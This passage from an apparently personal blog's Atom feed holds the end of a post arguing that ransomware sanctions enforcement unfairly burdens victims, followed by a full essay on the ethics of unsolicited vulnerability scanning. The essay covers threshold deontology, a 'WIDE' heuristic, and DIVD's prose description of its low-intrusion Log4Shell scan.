recover a payout after the fact if new intelligence or a late-issued designation reveals that the attackers were sanctioned. Retroactive enforcement of these exclusions, whether via contract or regulation, shifts the risk back onto those least equipped to verify attribution in real time: the victims. Structural asymmetry in ransomware enforcement The outcome is a deeply asymmetrical system. Attackers operate in a fluid, pseudonymous ecosystem. Defenders operate under legal obligations, audit trails, and policy scrutiny. Compliance rules are often applied rigidly. Not only by governments, but increasingly by cyber insurers, even when the available indicators are ambiguous. Our research calls attention to this structural misalignment. It is not simply a technical issue, but a policy failure. By placing the burden of accurate attribution on defenders, we ignore the reality that attribution is contested and delayed, even among experts. As I mentioned in the beginning of this article, this post does not argue against the principle of sanctions. It can be a legitimate tool of pressure, deprivation, and deterrence. Rather, it argues that sanctions policy must evolve to strike at the actors it was meant to constrain, not those it was meant to protect. Enforcement that punishes victims through uncertainty does not advance justice; it undermines it. Policy recommendations: toward risk-aware compliance Of course, I am not arguing that we should abandon sanctions policy altogether. Instead, it would be better to propose a more realistic and risk-aware approach: Recognize the limits of low-level indicators and require corroboration. Enforcement actions should not hinge on volatile indicators alone. Additional behavioral or contextual evidence should be required to support sanctions-related decisions. Promote the development and sharing of behavioral-level CTI. Encourage public-private sharing of ransomware tradecraft indicators and support open databases that track rebrand linkages, like the U.S. Cybersecurity and Infrastructure Security Agency’s (CISA) #StopRansomware campaign, where they share observed indicators from various organizations. Establish a cross-sector CTI clearing house. All 20 experts we interviewed independently called for a neutral, non-commercial platform to consolidate and curate ransomware attribution data. No single entity today has the necessary scope or trust to do this alone. Introduce proportionality and good-faith standards in compliance enforcement. If a victim acted on available information and had no access to classified or high-confidence attribution, they should be protected instead of penalized anywhere. Improve transparency of sanctions intelligence. Where governments establish control or continuity between groups, this information should be shared with defenders, not just for enforcement. These are not radical departures from current policy. They are adjustments grounded in the technical and operational realities of the ransomware ecosystem. Conclusion: enforcement should follow evidence, not assumption Sanctions are a legitimate tool of deterrence. But in the ransomware context, their enforcement often assumes more clarity and certainty than defenders and victims actually possess. Attribution is rarely unambiguous. Indicators change, groups rebrand, and intelligence arrives too late to guide real-time decisions. Current enforcement frameworks place responsibility on victims to act with perfect foresight in an environment defined by uncertainty. This doesn’t advance justice—it undermines it. If policy is to support resilience rather than amplify harm, it must reflect how threat intelligence actually works. That means supporting enforcement with persistent, behavioral signals rather than fragile, low-level ones. It also means ensuring that all parties involved have access to the same information. It means recognizing the asymmetries between attackers who can vanish and reappear at will, and defenders who are left to navigate compliance obligations in the dark. We can’t sanction what we can’t see. And we shouldn’t punish those who were never the intended target.]]></summary></entry><entry><title type="html">Unsolicited but Ethical: Threshold Deontology in Public Interest Vulnerability Disclosure</title><link href="http://localhost:4000/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html" rel="alternate" type="text/html" title="Unsolicited but Ethical: Threshold Deontology in Public Interest Vulnerability Disclosure" /><published>2025-05-10T00:00:00+02:00</published><updated>2025-05-10T00:00:00+02:00</updated><id>http://localhost:4000/2025/05/10/unsolicited-vulnerability-disclosure-ethics</id><content type="html" xml:base="http://localhost:4000/2025/05/10/unsolicited-vulnerability-disclosure-ethics.html"><![CDATA[<p>I often send emails to people I’ve never met, about systems they didn’t know were vulnerable, warning them about risks they never asked me to find. Often, they’re surprised. Mostly grateful. Occasionally hostile.</p>

<p>I can understand the discomfort. On the surface, without more in-depth knowledge, it can feel intrusive. Who asked me to scan their infrastructure? Who gave me permission to notify them about something they didn’t request? I’ve come to realize that in cybersecurity, waiting for consent isn’t always an ethical luxury we can afford. Sometimes, when a vulnerability threatens publicly accessible systems, the consequences of inaction quickly outweigh the social comfort of protocol.</p>

<h1 id="ethics-of-vulnerability-disclosure">Ethics of Vulnerability Disclosure</h1>
<p>At the <a href="https://divd.nl">Dutch Institute for Vulnerability Disclosure</a>, I work in a team that operates in that uncomfortable space between respecting boundaries and preventing harm. It’s not a line we walk casually, and one I’ve learned to approach with both caution and conviction. That’s why, at DIVD, we rely on a shared <a href="https://divd.nl/code">Code of Conduct</a> (CoC). This CoC is derived from a <a href="https://www.om.nl/documenten/richtlijnen/2020/december/14/om-beleidsbrief-ethisch-hacken#:~:text=Het%20Openbaar%20Ministerie%20heeft%20in,tegen%20een%20ethische%20hacker%20binnenkomt.">policy</a> that was published by the Dutch Public Prosecutor in 2020, which describes the circumstances under which computer hacking will be considered ethical and exempt from prosecution. This policy is based on years of debate and legal jurisprudence and has served the Dutch hacker community greatly up until now. The questions it provides to determine whether or not an action is ethical are as follows:</p>

<ul>
  <li>Was the action taken in the context of a significant public interest?</li>
  <li>Was the conduct proportionate (i.e., did the suspect not go further than necessary to achieve their objective)?</li>
  <li>Was the requirement of subsidiarity met (i.e., were there no less intrusive means available to achieve the intended objective)?</li>
</ul>

<p>The DIVD CoC guides our decisions to make sure we do not cross any ethical boundaries. This can get knotty quite quickly, as we attempt to locate everyone worldwide that may be vulnerable to a particular security vulnerability. Therefore we have to make well-thought-through decisions when it comes to worldwide vulnerability scans: we have to be sure that we do not intrude further than necessary and that our way of scanning is the least impactful one.</p>

<p>I’ve found myself to be increasingly exacting about this. If a scan doesn’t meet the ethical standards we’ve committed to at DIVD, it’s not uncommon to argue against executing it–even if that means walking away from a serious case. That may seem cautious, but it raises a deeper ethical question: When is a vulnerability severe enough that inaction becomes the more problematic choice?</p>

<p>This post argues that the ethical frameworks implicitly used by DIVD, particularly threshold deontology, provide a defensible basis for more intrusive forms of unsolicited vulnerability disclosure when the public interest is at stake.</p>

<h1 id="when-inaction-becomes-the-problem">When inaction becomes the problem</h1>
<p>Ethics in the computer security landscape have always been a topic of discussion. Recently, this discussion seems to have picked up in the academic world around the three leading frameworks and their respective ideologies:</p>

<ul>
  <li><strong>Consequentialism:</strong> Actions are morally right if it leads to the best overall outcomes or consequences. The use of consequentialism in this article mostly resembles utilitarianism, which is a type of consequentialism that focuses on the well-being of people.</li>
  <li><strong>Deontology:</strong> Actions are morally right if it follows a set of moral rules or duties, regardless of the outcome.</li>
  <li><strong>Virtue Ethics:</strong> Actions are morally right if it reflects the character and virtues of a good or morally exemplary person.</li>
</ul>

<p>While equally important, this post does not focus on virtue ethics. The challenge we face in Coordinated Vulnerability Disclosure is not about judging moral character. It’s about operationalizing structured processes, making ethically defensible decisions under pressure, and balancing duties with consequences. These are domains where rules and outcomes matter more directly than personal virtue.</p>

<p>This is confirmed by various studies in the academic landscape such as <a href="https://www.dhs.gov/sites/default/files/publications/CSD-MenloPrinciplesCORE-20120803_1.pdf">The Menlo Report</a> and the (more recent) study on <a href="https://www.usenix.org/system/files/usenixsecurity23-kohno.pdf">Computer Security Trolley Problems</a> by Kohno et al. These studies emphasize the importance of consequentialism and deontology where they intentionally leave virtue ethics out of scope. In contrast, studies of cybercrime — where intent, personal responsibility, and moral development are central — often lean more heavily on virtue ethics.</p>

<p>The tension between doing what’s right according to principle and doing what’s necessary to prevent harm lies at the center of many dilemmas in computer security. Deontology and consequentialism are often seen as opposites that lead to different outcomes when applied to the same case studies, leading these case studies to be seen as moral dilemmas. For this reason, one may realise that an absolutist approach to either of these frameworks may not be sufficient in practice when the intent is preventing harm. The Stanford Encyclopedia of Philosophy emphasizes this limitation by describing a balance through what is known as <a href="https://plato.stanford.edu/entries/ethics-deontological/#DeoRelConRec">threshold deontology</a>. Threshold deontology begins with a commitment to deontological principles such as minimizing intrusion and acting transparently. However, it recognizes that these rules may need to be overridden when the potential harm of inaction crosses a critical threshold. In other words:</p>

<blockquote>
  <p>We follow the rules, until not following them becomes the more ethical choice.</p>
</blockquote>

<p>Threshold deontology doesn’t abandon principles. It does, however, ask us to honor them until the consequences of strict adherence become morally unacceptable, to then act with caution for a societal cause.</p>

<h1 id="principles-in-practice">Principles in practice</h1>
<p>But how would we know when that threshold is actually crossed? Threshold deontology provides us with the ‘philosophical permission’ to override a duty, but it doesn’t say when exactly that override is justified. This is where the principlist framework can provide some guidance. Instead of relying on a single guiding rule, it asks us to weigh multiple ethical principles that often come into tension in practice. This helps us to assess not just whether an action is justified, but also why and what ethical trade-offs we are accepting in the process.</p>

<p>In 2021, Formosa et al. proposed <a href="https://www.sciencedirect.com/science/article/pii/S0167404821002066">a principlist framework</a> for cybersecurity that is composed of the following five principles:</p>

<ul>
  <li><strong>Beneficence:</strong> Promote well-being and prevent harm</li>
  <li><strong>Non-maleficence</strong>: Avoid causing harm</li>
  <li><strong>Autonomy:</strong> Respect individuals’ control over their systems and data</li>
  <li><strong>Justice:</strong> Ensure fairness and equitable treatment</li>
  <li><strong>Explicability:</strong> Act transparently and be accountable</li>
</ul>

<p>Formosa’s principlist framework is derived from Beauchamp and Childress’s <a href="https://jme.bmj.com/content/28/5/332.2">“Four Principles” of biomedical ethics</a> and added a fifth principle of explicability, which is drawn from <a href="https://link.springer.com/article/10.1007/s11023-018-9482-5">AI ethics</a> (Floridi et al., 2018). When we’re considering something like a global vulnerability scan, these principles help us structure our ethical reasoning. DIVD’s scanning decisions are centered on the principle of beneficence: the obligation to prevent harm and promote public safety. When the potential benefit of scanning is low, for example when a vulnerability poses little risk or is unlikely to be exploited, we hold firm to the non-maleficence (avoiding harm) and autonomy (respecting consent and responsibility) principles. In such cases, we will refrain from scanning because the ethical cost outweighs the limited benefit.</p>

<p>However, when the potential to prevent significant harm is high, such as when a vulnerability threatens large-scale exploitation or critical infrastructure, we may override non-maleficence and autonomy in service of that benefit. This is not a decision taken lightly. It reflects a careful ethical trade-off, where the duty to protect others justifies limited, well-controlled intrusion.</p>

<h1 id="how-wide-is-my-fingerprint">How WIDE is my fingerprint?</h1>
<p>To teach others about fingerprinting ethics, I often use a simple heuristic to assess the moral footprint of a fingerprinting technique called WIDE. WIDE stands for:</p>

<ul>
  <li><strong>Weaponized:</strong> Could this scanning methodology be used to (enable) harm? Or more practical: if the scanning methodology involves a public Proof of Concept, does it contain any malware that we would need to neutralize first? This reflects the principle of non-maleficence.</li>
  <li><strong>Intrusive:</strong> Does this scanning methodology cross any boundaries of consent, privacy, or proportionality? Does it leave any unnecessary traces on the target system? This brings autonomy and justice into view.</li>
  <li><strong>Deweaponized:</strong> Is this scanning methodology deliberately designed to reduce its exploitability? This ties to beneficence, the duty to protect.</li>
  <li><strong>Ethical:</strong> Would this technique hold up under scrutiny from others? Is it proportionate and according to subsidiarity standards? Here, explicability becomes essential to ensure transparency on decisions and reasoning.</li>
</ul>

<p><img src="../../../assets/WIDE_heuristic_diagram_darkbg.svg" alt="" /></p>

<p>When I ask myself, <em>“How WIDE is this fingerprint?”</em>, I’m not answering a closed question. I’m surfacing tensions. Even techniques that appear technically harmless can become ethically problematic if used carelessly, at scale, or without transparency. WIDE isn’t a substitute for principlism, but it does help bring the principles into everyday practice. It’s a kind of ethical gut check for ethical proportionality: quick, imperfect, but useful when decisions happen fast. Of course, ethics are subjective, which is why not everyone may agree with our framing. Especially when consent is missing, ethical objections matter.</p>

<h1 id="addressing-ethical-objections">Addressing ethical objections</h1>
<p>There are some <a href="https://www.hup.harvard.edu/books/9780674976009">counterarguments to unsolicited scanning</a>, such as concerns about overreach, digital trespassing, and the potential erosion of trust in security research. In the end, if subjectivity leads to the justification of compromising on the explicability principle, ethical boundaries are allowed to shift under pressure. How do we ensure they don’t shift too far?</p>

<p>These are legitimate concerns. However, this is exactly why it is important to rely on structured frameworks like threshold deontology and principlism: not to escape ethical boundaries, but to make these boundaries visible, contestable, and constrained. The point isn’t that anything is allowed when societal safety is at play. It’s that sometimes, doing nothing carries a greater ethical cost than acting carefully without permission.</p>

<h1 id="the-public-interest-threshold-of-log4shell">The public interest threshold of Log4Shell</h1>
<p>When <a href="https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance">Log4Shell</a> was disclosed in late 2021, it posed a severe threat to global digital infrastructure. The vulnerability affected countless systems, many of which were unknown to be using this software, and exploitation began within hours of public disclosure as it was trivial to exploit. It became clear quickly that this vulnerability didn’t just pose a theoretical risk, but a real-world crisis.</p>

<p>Log4J, the vulnerable software, was a logging component embedded in many other systems, making this a supply chain issue. The team at DIVD working on this case then faced a difficult question: how to responsibly notify affected organizations across the globe, many of which had no idea they were even using Log4J?</p>

<p>In such a high-stakes context, the threshold for ethical intervention was clearly crossed. The potential for harm was immense, as this vulnerability could lead to ransomware, data breaches, and critical infrastructure failures, disrupting society on a large scale. Because Log4J was embedded in other software rather than a standalone component, scanning was not possible without triggering the vulnerability itself. The considerations central to the WIDE heuristic helped to assess this approach: where many actors were mass-exploiting systems at random to test for the vulnerability, DIVD’s scanning methodology was deliberately deweaponized to reduce exploitability and kept as non-intrusive as possible by avoiding persistence or harmful effects.</p>

<p>To achieve this, DIVD created a Log4Shell exploit that triggered a single DNS request to a <a href="https://www.canarytokens.org/nest/">Canary Token</a> from inside the vulnerable system: an approach that was harmless and, of all options, the least intrusive. It only revealed the vulnerable IP address and nothing more. The actions taken were designed to be ethical: proportionate to the risk, grounded in subsidiarity, and subject to public scrutiny. In doing so, we aimed to maximize beneficence, minimize maleficence, respect justice, and uphold explicability—even where autonomy had to be limited for the sake of public safety.</p>

<h1 id="conclusion-trust-through-transparent-ethics">Conclusion: Trust through transparent ethics</h1>
<p>Coordinated Vulnerability Disclosure isn’t just a technical challenge: it’s an ethical one. At DIVD, we don’t treat unsolicited scanning and disclosure as a loophole or an afterthought. We treat it as an action that requires justification, restraint, and transparency.</p>

<p>Threshold deontology provides us with the ethical architecture to act decisively when society is at risk. The principlist framework implicitly helps us navigate that threshold with clarity, so we’re not acting on instinct, but on structured ethical reasoning. I’m sharing this to explain how I think about the ethics behind unsolicited disclosure. Not because we see ourselves as above ethical rules at DIVD, but because we try to follow them as rigorously as possible, even when the path forward isn’t obvious.</p>]]></content><author><name>Max van der Horst</name><email>mhvanderhorst@tudelft.nl</email></author><category term="Cybersecurity Policy &amp; Ethics" /><category term="Vulnerability Disclosure" /><summary type="html"><![CDATA[I often send emails to people I’ve never met, about systems they didn’t know were vulnerable, warning them about risks they never asked me to find. Often, they’re surprised. Mostly grateful. Occasionally hostile. I can understand the discomfort. On the surface, without more in-depth knowledge, it can feel intrusive. Who asked me to scan their infrastructure? Who gave me permission to notify them about something they didn’t request? I’ve come to realize that in cybersecurity, waiting for consent isn’t always an ethical luxury we can afford. Sometimes, when a vulnerability threatens publicly accessible systems, the consequences of inaction quickly outweigh the social comfort of protocol. Ethics of Vulnerability Disclosure At the Dutch Institute for Vulnerability Disclosure, I work in a team that operates in that uncomfortable space between respecting boundaries and preventing harm. It’s not a line we walk casually, and one I’ve learned to approach with both caution and conviction. That’s why, at DIVD, we rely on a shared Code of Conduct (CoC). This CoC is derived from a policy that was published by the Dutch Public Prosecutor in 2020, which describes the circumstances under which computer hacking will be considered ethical and exempt from prosecution. This policy is based on years of debate and legal jurisprudence and has served the Dutch hacker community greatly up until now. The questions it provides to determine whether or not an action is ethical are as follows: Was the action taken in the context of a significant public interest? Was the conduct proportionate (i.e., did the suspect not go further than necessary to achieve their objective)? Was the requirement of subsidiarity met (i.e., were there no less intrusive means available to achieve the intended objective)? The DIVD CoC guides our decisions to make sure we do not cross any ethical boundaries. This can get knotty quite quickly, as we attempt to locate everyone worldwide that may be vulnerable to a particular security vulnerability. Therefore we have to make well-thought-through decisions when it comes to worldwide vulnerability scans: we have to be sure that we do not intrude further than necessary and that our way of scanning is the least impactful one. I’ve found myself to be increasingly exacting about this. If a scan doesn’t meet the ethical standards we’ve committed to at DIVD, it’s not uncommon to argue against executing it–even if that means walking away from a serious case. That may seem cautious, but it raises a deeper ethical question: When is a vulnerability severe enough that inaction becomes the more problematic choice? This post argues that the ethical frameworks implicitly used by DIVD, particularly threshold deontology, provide a defensible basis for more intrusive forms of unsolicited vulnerability disclosure when the public interest is at stake. When inaction becomes the problem Ethics in the computer security landscape have always been a topic of discussion. Recently, this discussion seems to have picked up in the academic world around the three leading frameworks and their respective ideologies: Consequentialism: Actions are morally right if it leads to the best overall outcomes or consequences. The use of consequentialism in this article mostly resembles utilitarianism, which is a type of consequentialism that focuses on the well-being of people. Deontology: Actions are morally right if it follows a set of moral rules or duties, regardless of the outcome. Virtue Ethics: Actions are morally right if it reflects the character and virtues of a good or morally exemplary person. While equally important, this post does not focus on virtue ethics. The challenge we face in Coordinated Vulnerability Disclosure is not about judging moral character. It’s about operationalizing structured processes, making ethically defensible decisions under pressure, and balancing duties with consequences. These are domains where rules and outcomes matter more directly than personal virtue. This is confirmed by various studies in the academic landscape such as The Menlo Report and the (more recent) study on Computer Security Trolley Problems by Kohno et al. These studies emphasize the importance of consequentialism and deontology where they intentionally leave virtue ethics out of scope. In contrast, studies of cybercrime — where intent, personal responsibility, and moral development are central — often lean more heavily on virtue ethics. The tension between doing what’s right according to principle and doing what’s necessary to prevent harm lies at the center of many dilemmas in computer security. Deontology and consequentialism are often seen as opposites that lead to different outcomes when applied to the same case studies, leading these case studies to be seen as moral dilemmas. For this reason, one may realise that an absolutist approach to either of these frameworks may not be sufficient in practice when the intent is preventing harm. The Stanford Encyclopedia of Philosophy emphasizes this limitation by describing a balance through what is known as threshold deontology. Threshold deontology begins with a commitment to deontological principles such as minimizing intrusion and acting transparently. However, it recognizes that these rules may need to be overridden when the potential harm of inaction crosses a critical threshold. In other words: We follow the rules, until not following them becomes the more ethical choice. Threshold deontology doesn’t abandon principles. It does, however, ask us to honor them until the consequences of strict adherence become morally unacceptable, to then act with caution for a societal cause. Principles in practice But how would we know when that threshold is actually crossed? Threshold deontology provides us with the ‘philosophical permission’ to override a duty, but it doesn’t say when exactly that override is justified. This is where the principlist framework can provide some guidance. Instead of relying on a single guiding rule, it asks us to weigh multiple ethical principles that often come into tension in practice. This helps us to assess not just whether an action is justified, but also why and what ethical trade-offs we are accepting in the process. In 2021, Formosa et al. proposed a principlist framework for cybersecurity that is composed of the following five principles: Beneficence: Promote well-being and prevent harm Non-maleficence: Avoid causing harm Autonomy: Respect individuals’ control over their systems and data Justice: Ensure fairness and equitable treatment Explicability: Act transparently and be accountable Formosa’s principlist framework is derived from Beauchamp and Childress’s “Four Principles” of biomedical ethics and added a fifth principle of explicability, which is drawn from AI ethics (Floridi et al., 2018). When we’re considering something like a global vulnerability scan, these principles help us structure our ethical reasoning. DIVD’s scanning decisions are centered on the principle of beneficence: the obligation to prevent harm and promote public safety. When the potential benefit of scanning is low, for example when a vulnerability poses little risk or is unlikely to be exploited, we hold firm to the non-maleficence (avoiding harm) and autonomy (respecting consent and responsibility) principles. In such cases, we will refrain from scanning because the ethical cost outweighs the limited benefit. However, when the potential to prevent significant harm is high, such as when a vulnerability threatens large-scale exploitation or critical infrastructure, we may override non-maleficence and autonomy in service of that benefit. This is not a decision taken lightly. It reflects a careful ethical trade-off, where the duty to protect others justifies limited, well-controlled intrusion. How WIDE is my fingerprint? To teach others about fingerprinting ethics, I often use a simple heuristic to assess the moral footprint of a fingerprinting technique called WIDE. WIDE stands for: Weaponized: Could this scanning methodology be used to (enable) harm? Or more practical: if the scanning methodology involves a public Proof of Concept, does it contain any malware that we would need to neutralize first? This reflects the principle of non-maleficence. Intrusive: Does this scanning methodology cross any boundaries of consent, privacy, or proportionality? Does it leave any unnecessary traces on the target system? This brings autonomy and justice into view. Deweaponized: Is this scanning methodology deliberately designed to reduce its exploitability? This ties to beneficence, the duty to protect. Ethical: Would this technique hold up under scrutiny from others? Is it proportionate and according to subsidiarity standards? Here, explicability becomes essential to ensure transparency on decisions and reasoning. When I ask myself, “How WIDE is this fingerprint?”, I’m not answering a closed question. I’m surfacing tensions. Even techniques that appear technically harmless can become ethically problematic if used carelessly, at scale, or without transparency. WIDE isn’t a substitute for principlism, but it does help bring the principles into everyday practice. It’s a kind of ethical gut check for ethical proportionality: quick, imperfect, but useful when decisions happen fast. Of course, ethics are subjective, which is why not everyone may agree with our framing. Especially when consent is missing, ethical objections matter. Addressing ethical objections There are some counterarguments to unsolicited scanning, such as concerns about overreach, digital trespassing, and the potential erosion of trust in security research. In the end, if subjectivity leads to the justification of compromising on the explicability principle, ethical boundaries are allowed to shift under pressure. How do we ensure they don’t shift too far? These are legitimate concerns. However, this is exactly why it is important to rely on structured frameworks like threshold deontology and principlism: not to escape ethical boundaries, but to make these boundaries visible, contestable, and constrained. The point isn’t that anything is allowed when societal safety is at play. It’s that sometimes, doing nothing carries a greater ethical cost than acting carefully without permission. The public interest threshold of Log4Shell When Log4Shell was disclosed in late 2021, it posed a severe threat to global digital infrastructure. The vulnerability affected countless systems, many of which were unknown to be using this software, and exploitation began within hours of public disclosure as it was trivial to exploit. It became clear quickly that this vulnerability didn’t just pose a theoretical risk, but a real-world crisis. Log4J, the vulnerable software, was a logging component embedded in many other systems, making this a supply chain issue. The team at DIVD working on this case then faced a difficult question: how to responsibly notify affected organizations across the globe, many of which had no idea they were even using Log4J? In such a high-stakes context, the threshold for ethical intervention was clearly crossed. The potential for harm was immense, as this vulnerability could lead to ransomware, data breaches, and critical infrastructure failures, disrupting society on a large scale. Because Log4J was embedded in other software rather than a standalone component, scanning was not possible without triggering the vulnerability itself. The considerations central to the WIDE heuristic helped to assess this approach: where many actors were mass-exploiting systems at random to test for the vulnerability, DIVD’s scanning methodology was deliberately deweaponized to reduce exploitability and kept as non-intrusive as possible by avoiding persistence or harmful effects. To achieve this, DIVD created a Log4Shell exploit that triggered a single DNS request to a Canary Token from inside the vulnerable system: an approach that was harmless and, of all options, the least intrusive. It only revealed the vulnerable IP address and nothing more. The actions taken were designed to be ethical: proportionate to the risk, grounded in subsidiarity, and subject to public scrutiny. In doing so, we aimed to maximize beneficence, minimize maleficence, respect justice, and uphold explicability—even where autonomy had to be limited for the sake of public safety. Conclusion: Trust through transparent ethics Coordinated Vulnerability Disclosure isn’t just a technical challenge: it’s an ethical one. At DIVD, we don’t treat unsolicited scanning and disclosure as a loophole or an afterthought. We treat it as an action that requires justification, restraint, and transparency. Threshold deontology provides us with the ethical architecture to act decisively when society is at risk. The principlist framework implicitly helps us navigate that threshold with clarity, so we’re not acting on instinct, but on structured ethical reasoning. I’m sharing this to explain how I think about the ethics behind unsolicited disclosure. Not because we see ourselves as above ethical rules at DIVD, but because we try to follow them as rigorously as possible, even when the path forward isn’t obvious.]]></summary></entry></feed>